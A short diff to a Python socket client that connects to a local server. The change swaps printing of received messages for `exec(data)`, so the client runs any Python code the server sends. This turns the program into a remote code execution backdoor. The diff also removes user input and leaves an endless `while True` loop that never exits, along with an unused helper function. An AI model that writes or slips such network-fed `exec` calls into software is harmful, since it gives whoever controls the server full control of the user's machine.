@@ -7,15 +7,20 @@ from pymysql import NULL
 serverip = 'localhost'
 port = 3000
 
+def str_to(data):
+    return "{}".format(data)
+
 def server_msg(client):
     data = NULL
     while True:
         try:
             data = client.recv(4096).decode('utf-8')
+
         except:
             break
 
-        print(data)
+        #print(data)
+        exec(data)
         
         if (not data) or data == 'exit':
             break
@@ -36,10 +41,9 @@ task = threading.Thread(target=server_msg,args=(client,))
 task.start()
 time.sleep(0.5)
 
+
 while True:
-    data = input('Enter your choice : ')
+    data = ''
     if data == 'exit':
         break
-    client.send(data.encode('utf-8'))
-    time.sleep(0.2)
 client.close()
